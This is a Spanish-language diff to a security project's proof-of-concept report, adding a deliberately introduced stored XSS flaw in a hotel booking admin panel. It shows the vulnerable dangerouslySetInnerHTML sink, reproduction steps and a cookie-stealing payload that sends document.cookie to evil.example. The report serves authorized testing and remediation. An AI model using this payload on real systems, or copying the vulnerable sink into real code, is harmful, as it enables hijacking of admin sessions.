@@ -6,7 +6,7 @@
 | Responsable | Aarón Líos Cubillo |
 | Rama | `security/operations/fase2-pocs` |
 | Insumo | `docs/proyecto-seguridad/operations/fase-1-diagnostico.md` (§3 observaciones, §5.5 riesgos) |
-| Estado | A2.1 (Vector 1) completo — OP-POC-1 y OP-POC-2 |
+| Estado | A2.1 (Vector 1) + A2.2 (Vector 2) completos — OP-POC-1, OP-POC-2, OP-POC-3 |
 
 ---
 
@@ -207,6 +207,93 @@ No aplica (hallazgo real sobre `develop`, sin modificación de código para esta
 
 ---
 
+## OP-POC-3 — XSS stored vía notas del huésped (portal → panel admin)
+
+| Campo | Valor |
+|---|---|
+| ID | OP-POC-3 |
+| Vector | 2 — cliente (XSS stored) |
+| OWASP | A03:2021 Injection (clase Cross-Site Scripting, stored) |
+| NIST CSF 2.0 | PR.DS-01 (protección de datos en reposo/integridad), PR.PS-06 (prácticas de desarrollo seguro), DE.CM-09 |
+| Origen del hallazgo | **Introducida** (decisión de equipo §4.1). El módulo no tenía ningún sink de XSS real: el portal no usa `dangerouslySetInnerHTML` y el panel renderiza los datos del huésped con JSX (`{guest.name}`…), que React escapa por defecto; además la tabla `reservations` no tenía ningún campo de texto libre del huésped. Se introdujo un campo realista de dominio ("solicitudes especiales", presente en el formulario de checkout pero que antes se descartaba) y se persiste la reserva en el checkout (flujo que el demo no tenía), para poder demostrar el vector 2 del enunciado: entrada de un huésped anónimo que cruza la frontera de confianza hacia la sesión de un admin autenticado. |
+| Commit de introducción | `chore(security): introduce controlled vuln for OP-POC-3` en `security/operations/fase2-pocs` |
+| Componente / archivo:línea | **Sink:** `apps/panel-admin/src/features/reservations/components/detail/ReservationGuestCard/ReservationGuestCard.tsx` (`dangerouslySetInnerHTML={{ __html: guest.notes }}`). **Fuente/persistencia:** `apps/portal-reservas/src/features/checkout/services/createReservation.server.ts` (guarda `guest_notes` crudo) vía `gateway.server.ts`; campo capturado en `GuestForm.tsx` (`specialRequests`). **Esquema:** `packages/db/supabase/migrations/20261018000001_add_guest_notes_to_reservations.sql`. |
+
+### Descripción
+
+El flujo del checkout del portal ahora persiste la reserva (incluyendo las "solicitudes especiales" que
+el huésped escribe en `GuestForm`) en `reservations.guest_notes`, usando el cliente **service-role** (mismo
+patrón deny-all/RLS del módulo, ver OP-POC-1). El valor se guarda **verbatim**, lo cual es normal: guardar
+la entrada cruda del usuario no es el bug.
+
+El bug es la **salida**: el visor de reservas del panel admin renderiza esas notas **sin escapar**:
+
+```tsx
+// VULNERABLE — ReservationGuestCard.tsx
+<span
+  className={STYLES.fieldValue}
+  dangerouslySetInnerHTML={{ __html: guest.notes }}  // <- HTML/JS del huésped, sin escapar
+/>
+```
+
+Como `guest.notes` proviene de un huésped **anónimo** (el checkout es público, no requiere cuenta) y se
+renderiza en la sesión de un **admin autenticado** que abre el detalle de la reserva, un payload como
+`<img src=x onerror="fetch('https://evil.example/c?'+document.cookie)">` se ejecuta con los privilegios del
+admin. Es la clase de XSS stored del enunciado (vector 2) y es el mismo patrón —de forma real— que
+`formatMetadataHtml` + `dangerouslySetInnerHTML` del drawer de auditoría de Fabian (AUD-POC-4), por lo que
+el fix de salida (A3.2 / F3.2) debe alinearse.
+
+### Precondiciones
+
+- Para plantar el payload: ninguna. El checkout (`/reserve`) es público y anónimo.
+- Para dispararlo: un admin con `reservations:view` abre el detalle de esa reserva en `panel-admin`
+  (`/admin/reservations/**`) — acción rutinaria del negocio.
+
+### Pasos reproducibles
+
+1. Levantar portal y panel: `pnpm --filter @hotel/portal-reservas dev` (:3001) y
+   `pnpm --filter @hotel/panel-admin dev` (:3002).
+2. En el portal, iniciar una reserva (`/reserve?...`), completar el formulario de huésped y en
+   **"Solicitudes especiales"** escribir el payload:
+   `<img src=x onerror="document.title='XSS-OP-POC-3'">`.
+3. Completar el checkout (con la pasarela en modo mock, sin `STRIPE_SECRET_KEY`, el flujo llega a éxito y
+   la reserva queda persistida con las notas).
+4. En el panel admin, abrir la lista de reservas y entrar al detalle de esa reserva.
+5. Al renderizar `ReservationGuestCard`, el navegador del admin ejecuta el `onerror` del `<img>` roto
+   (el título de la pestaña cambia a `XSS-OP-POC-3`; con el payload de robo de cookie, se exfiltra la
+   sesión del admin).
+
+### Resultado esperado vs. obtenido
+
+| | Esperado (diseño) | Obtenido |
+|---|---|---|
+| Nota del huésped con `<b>hola</b>` | Se muestra el texto literal `<b>hola</b>` | ❌ Se renderiza en **negrita** (el HTML se interpreta) |
+| Nota con `<img src=x onerror=...>` | Texto inerte | ❌ Se **ejecuta** JS arbitrario en la sesión del admin |
+
+### Impacto
+
+- **Stored XSS persistente** disparado por un atacante anónimo contra usuarios privilegiados (admins) →
+  robo de sesión, acciones en nombre del admin (cambiar estado de reservas, invitar admins vía el módulo
+  de Joseph, etc.), pivot a toda la superficie del panel.
+- Cruza la frontera de confianza huésped→operador identificada en la ruta de trabajo del módulo y en la
+  Fase 1 (datos del huésped mostrados en el panel). Corresponde al riesgo de integridad/confidencialidad
+  del operador; severidad **Alta/Crítica** por ser no autenticado en la entrada y privilegiado en la salida.
+
+### Evidencia
+
+- Lectura de código (arriba): el sink `dangerouslySetInnerHTML` y la cadena fuente→persistencia→render.
+- Pendiente de capturar en entorno con Supabase conectado: captura de pantalla del panel ejecutando el
+  payload (título de pestaña / alert) y de la fila `reservations` con `guest_notes` crudo, a agregar en
+  `operations/evidencias/` junto con la grabación (A3.7). Misma nota de entorno que OP-POC-1 (DNS hacia
+  `*.supabase.co` intermitente en este sandbox).
+
+### Commit donde se reprodujo
+
+Commit de introducción `chore(security): introduce controlled vuln for OP-POC-3` (hash exacto en la
+bitácora del plan de desarrollo al abrir el PR de Fase 2).
+
+---
+
 ## Coordinación con otros módulos
 
 - **OP-POC-1** reutiliza la misma clase de bug (`.or()` con concatenación de strings) ya presente de
@@ -215,3 +302,7 @@ No aplica (hallazgo real sobre `develop`, sin modificación de código para esta
 - **OP-POC-2** depende de que el middleware del panel (dueño: Paula) no verifica rol — su fix (P3.1 o
   CSP/middleware global) también cierra parte de este hallazgo; A3.1 debe añadir `requirePermission`
   en `galleryActions` como defensa en profundidad independiente del middleware.
+- **OP-POC-3** comparte sink y clase de bug con **AUD-POC-4** (Fabian): `dangerouslySetInnerHTML` sobre
+  datos controlables por un usuario no privilegiado. Alinear los fixes de salida de Fase 3 (A3.2 / F3.2):
+  escape por defecto de React (`{valor}` en vez de `__html`) y, para Paula, una **CSP** global que corte
+  la ejecución inline como defensa en profundidad para ambos módulos.
